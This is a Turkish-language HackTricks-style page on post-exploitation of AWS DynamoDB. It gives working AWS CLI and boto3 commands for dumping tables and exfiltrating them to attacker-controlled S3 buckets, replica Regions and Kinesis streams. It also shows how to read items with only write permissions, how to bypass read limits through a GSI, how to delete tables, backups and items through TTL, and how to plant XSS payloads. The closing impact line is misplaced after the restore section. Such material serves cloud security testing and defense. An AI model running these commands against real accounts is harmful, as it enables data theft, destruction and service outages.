# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

Bu izne sahip bir saldırgan, tabloların birincil anahtarına göre **öğeleri alabilir** (tablodaki tüm verileri doğrudan isteyemezsiniz). Bu, birincil anahtarları bilmeniz gerektiği anlamına gelir (bunu tablo meta verilerini alarak öğrenebilirsiniz (`describe-table`).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Olası Etki:** Tablodaki hassas bilgileri bularak dolaylı privesc

### `dynamodb:GetItem`

**Önceki izinlere benzer şekilde** bu izin, potansiyel bir saldırıcının sadece 1 tablodan, alınacak kaydın birincil anahtarı verildiğinde değerleri okumasına izin verir:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
Bu izinle ayrıca **`transact-get-items`** metodunu şu şekilde kullanmak da mümkündür:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potansiyel Etki:** Tablodaki hassas bilgileri bularak dolaylı privesc

### `dynamodb:Query`

**Similar to the previous permissions** bu izin, bir saldırganın yalnızca alınacak girdinin birincil anahtarı verildiğinde tek bir tablodan değerleri okumasına izin verir. Bir [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) kullanmaya izin verir, ancak birincil anahtarla (görünmesi gereken) izin verilen tek karşılaştırma "EQ" olduğundan, bir istekte tüm DB'yi almak için bir karşılaştırma kullanamazsınız.

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potansiyel Etki:** Tablodaki hassas bilgileri tespit ederek dolaylı privesc

### `dynamodb:Scan`

Bu izni kullanarak **tüm tabloyu kolayca dump edebilirsiniz**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potansiyel Etki:** Indirect privesc — tablodaki hassas bilgileri bularak

### `dynamodb:PartiQLSelect`

Bu izni kullanarak **tabloda bulunan tüm verileri kolayca dump edebilirsiniz**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Bu izin ayrıca `batch-execute-statement` gibi işlemleri gerçekleştirmeye de izin verir:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
ancak birincil anahtara bir değer belirtmeniz gerekiyor, bu yüzden o kadar kullanışlı değil.

**Potansiyel Etki:** Tabloda hassas bilgileri bularak dolaylı privesc

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Bu izin, bir saldırganın **tüm tabloyu tercih ettiği bir S3 bucket'ına dışa aktarmasına** izin verir:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Not: bunun çalışması için tablonun point-in-time-recovery etkinleştirilmiş olması gerekir; tablonun bunu sağlayıp sağlamadığını şu komutla kontrol edebilirsiniz:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
Etkin değilse, **etkinleştirmeniz** gerekecek ve bunun için **`dynamodb:ExportTableToPointInTime`** iznine ihtiyacınız var:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Olası Etki:** Tablodaki hassas bilgileri tespit ederek dolaylı privesc

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Bu izinlerle, bir saldırgan **yedekten yeni bir tablo oluşturabilir** (veya hatta önce bir yedek oluşturup bunu farklı bir tabloda restore edebilir). Ardından, gerekli izinlerle, yedeklerdeki **bilgileri** kontrol edebilir; bu bilgiler **artık üretim tablosunda bulunmayabilir**.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Olası Etki:** Tablo yedeğinde hassas bilgileri bularak dolaylı privesc

### `dynamodb:PutItem`

Bu izin, kullanıcıların tabloya **yeni bir öğe eklemesine veya mevcut bir öğeyi yeni bir öğe ile değiştirmesine** olanak tanır. Aynı birincil anahtara sahip bir öğe zaten varsa, **tüm öğe yeni öğe ile değiştirilecektir**. Birincil anahtar mevcut değilse, belirtilen birincil anahtara sahip yeni bir öğe **oluşturulacaktır**.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** DynamoDB tablosuna veri ekleyip/değiştirebilme yoluyla ilave güvenlik açıklarının ve bypasses'in sömürülmesi

### `dynamodb:UpdateItem`

Bu izin kullanıcılara bir öğenin mevcut özniteliklerini **değiştirme veya öğeye yeni öznitelikler ekleme** yetkisi verir. O **tüm öğeyi değiştirmez**; yalnızca belirtilen öznitelikleri günceller. Eğer tabloda belirtilen birincil anahtar yoksa, işlem belirtilen birincil anahtarla **yeni bir öğe oluşturacak** ve güncelleme ifadesinde belirtilen öznitelikleri ayarlayacaktır.

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Olası Etki:** Bir DynamoDB tablosuna veri ekleme/değiştirme yetkisi ile ilave vulnerabilities/bypasses istismarı

### `dynamodb:DeleteTable`

Bu izne sahip bir saldırgan bir DynamoDB tablosunu **silebilir; bu da veri kaybına yol açar**.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Olası etki**: Silinen tabloya bağlı hizmetlerde veri kaybı ve kesinti.

### `dynamodb:DeleteBackup`

Bu izne sahip bir saldırgan **DynamoDB yedeğini silebilir; bu, felaket kurtarma durumunda potansiyel olarak veri kaybına neden olabilir**.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Olası etki**: Veri kaybı ve bir felaket kurtarma senaryosunda yedekten geri yükleyememe.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: Bunun gerçekten çalışıp çalışmadığını test et

Bu izinlere sahip bir saldırgan, **bir DynamoDB tablosunda bir stream etkinleştirebilir, tabloyu değişiklikleri akışa başlaması için güncelleyebilir ve ardından tablodaki değişiklikleri gerçek zamanlı olarak izlemek için stream'e erişebilir**. Bu, saldırganın veri değişikliklerini izlemesine ve exfiltrate etmesine olanak tanır; bu da potansiyel olarak data leakage ile sonuçlanabilir.

1. Bir DynamoDB tablosunda stream etkinleştirin:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. ARN ve diğer ayrıntıları elde etmek için stream'i tanımlayın:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. stream ARN'sini kullanarak shard iterator'ını alın:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. shard iterator'ı kullanarak stream'den verileri exfiltrate edin:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potansiyel etki**: DynamoDB tablosunun değişikliklerinin gerçek zamanlı izlenmesi ve veri sızıntısı.

### `dynamodb:UpdateItem` ve `ReturnValues=ALL_OLD` ile öğeleri okuma

Bir saldırgan, bir tabloda yalnızca `dynamodb:UpdateItem` iznine sahip olsa bile, zararsız bir güncelleme yapıp `--return-values ALL_OLD` isteyerek normal okuma izinleri (`GetItem`/`Query`/`Scan`) olmadan öğeleri okuyabilir. DynamoDB, yanıtın `Attributes` alanında öğenin güncelleme öncesi tam görüntüsünü döndürecektir (bu, RCU tüketmez).

- Minimum izinler: `dynamodb:UpdateItem` hedef tablo/anahtar üzerinde.
- Ön koşullar: Öğenin birincil anahtarını bilmelisiniz.

Örnek (zararsız bir attribute ekler ve yanıt içinde önceki öğeyi exfiltrates):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
CLI yanıtı, önceki öğenin tamamını (tüm öznitelikler) içeren bir `Attributes` bloğu içerecek; bu, fiilen yalnızca yazma izniyle okuma yeteneği sağlar.

**Olası Etki:** Sadece yazma izinleriyle bir tablodan rastgele öğeler okunabilir; birincil anahtarlar bilindiğinde hassas verilerin exfiltration yoluyla ele geçirilmesine olanak tanır.


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

Yeni bir replica Region ekleyerek DynamoDB Global Table (sürüm 2019.11.21) üzerinde stealth exfiltration yapılabilir. Bir principal bölgesel bir replica ekleyebiliyorsa, tüm tablo saldırganın seçtiği Region'a kopyalanır ve saldırgan buradan tüm öğeleri okuyabilir.

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

İzinler: hedef tabloda `dynamodb:UpdateTable` (`replica-updates` ile) veya `dynamodb:CreateTableReplica`. Eğer replica'da CMK kullanılıyorsa, o anahtar için KMS izinleri gerekebilir.

Olası Etki: Tüm tablonun saldırganın kontrolündeki bir Region'a tam olarak çoğaltılması; bu da gizli data exfiltration'a yol açabilir.

### `dynamodb:TransactWriteItems` (başarısız koşul aracılığıyla okuma + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

Transaksiyonel yazma yetkisine sahip bir saldırgan, `TransactWriteItems` içinde kasıtlı olarak bir `ConditionExpression`'ı başarısız kılan ve `ReturnValuesOnConditionCheckFailure=ALL_OLD` olarak ayarlanan bir `Update` gerçekleştirerek mevcut bir öğenin tüm özniteliklerini exfiltrate edebilir. Başarısızlık durumunda DynamoDB, işlem iptal nedenleri içinde önceki öznitelikleri dahil eder; bu da hedef anahtarlara yönelik sadece yazma erişimini fiilen okuma erişimine dönüştürür.

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

İzinler: `dynamodb:TransactWriteItems` hedef tabloda (ve ilgili item üzerinde). Okuma izinlerine gerek yok.

Potansiyel Etki: Yalnızca transactional write ayrıcalıkları kullanarak, iade edilen iptal nedenleri aracılığıyla bir tablodan (birincil anahtara göre) rastgele item'ları okuyabilme.


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` GSI üzerinde

Düşük entropili bir attribute üzerinde `ProjectionType=ALL` ile bir Global Secondary Index (GSI) oluşturarak okuma kısıtlamalarını atlayın, bu attribute'u item'larda sabit bir değere ayarlayın, sonra tüm item'ları almak için index'i `Query` edin. Bu, base table üzerinde `Query`/`Scan` reddedilmiş olsa bile, index ARN'sine sorgu yapabiliyorsanız işe yarar.

- Minimum izinler:
- `dynamodb:UpdateTable` hedef tabloda (GSI'yi `ProjectionType=ALL` ile oluşturmak için).
- `dynamodb:UpdateItem` hedef tablo anahtarlarında (her item için indexlenen attribute'u ayarlamak için).
- `dynamodb:Query` index resource ARN'si üzerinde (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

Adımlar (PoC us-east-1'de):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**Olası Etki:** Tüm tablo exfiltration'ı, tüm öznitelikleri projekte eden yeni oluşturulmuş bir GSI sorgulanarak, temel tablo okuma API'leri engellense bile.


### `dynamodb:EnableKinesisStreamingDestination` (Kinesis Data Streams aracılığıyla sürekli exfiltration)

Tablodaki değişiklikleri saldırgan kontrollü bir Kinesis Data Stream'e sürekli exfiltrate etmek için DynamoDB Kinesis streaming destinasyonlarının kötüye kullanılması. Etkinleştirildiğinde, her INSERT/MODIFY/REMOVE olayı tablo üzerinde okuma izinlerine ihtiyaç olmadan neredeyse gerçek zamanlı olarak streame iletilir.

Minimum izinler (saldırgan):
- `dynamodb:EnableKinesisStreamingDestination` hedef tabloda
- İsteğe bağlı olarak durumu izlemek için `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable`
- Kayıtları tüketmek için saldırganın sahip olduğu Kinesis stream üzerinde okuma izinleri: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

dynamodb:UpdateTimeToLive iznine sahip bir saldırgan, bir tablonun TTL (time-to-live) yapılandırmasını — TTL'i etkinleştirme veya devre dışı bırakma — değiştirebilir. TTL etkinleştirildiğinde, yapılandırılmış TTL özniteliğini içeren bireysel öğeler, son kullanma zamanına ulaşıldığında otomatik olarak silinir. TTL değeri her öğedeki başka bir özniteliktir; bu özniteliği içermeyen öğeler TTL tabanlı silinmeden etkilenmez.

Eğer öğeler zaten TTL özniteliğini içermiyorsa, saldırganın TTL özniteliğini ekleyip toplu silinmeleri tetiklemek için öğeleri güncelleyen bir izne (örneğin dynamodb:UpdateItem) de ihtiyacı olur.

İlk olarak tabloda TTL'i etkinleştirin; silinme için kullanılacak öznitelik adını belirtin:
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
Sonra öğeleri, TTL özniteliğini (epoch saniyeleri) ekleyecek şekilde güncelleyin, böylece süresi dolup kaldırılacaklar:
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

dynamodb:RestoreTableFromAwsBackup veya dynamodb:RestoreTableToPointInTime izinlerine sahip bir saldırgan, orijinal tabloya zarar vermeden yedeklerden veya point-in-time recovery (PITR) ile geri yüklenen yeni tablolar oluşturabilir. Geri yüklenen tablo, seçilen zamandaki verilerin tam bir görüntüsünü içerir; bu nedenle saldırgan bunu geçmiş bilgileri exfiltrate etmek veya veritabanının önceki durumunun tam dökümünü elde etmek için kullanabilir.

Restore a DynamoDB table from an on-demand backup:
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
DynamoDB tablosunu bir zamandaki duruma geri yükle (geri yüklenen durumla yeni bir tablo oluştur):
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**Potential Impact:** Tablodaki değişikliklerin, tablo üzerinde doğrudan okuma işlemi yapılmaksızın, saldırgan tarafından kontrol edilen bir Kinesis akışına sürekli, neredeyse gerçek zamanlı olarak sızdırılması.



{{#include ../../../../banners/hacktricks-training.md}}
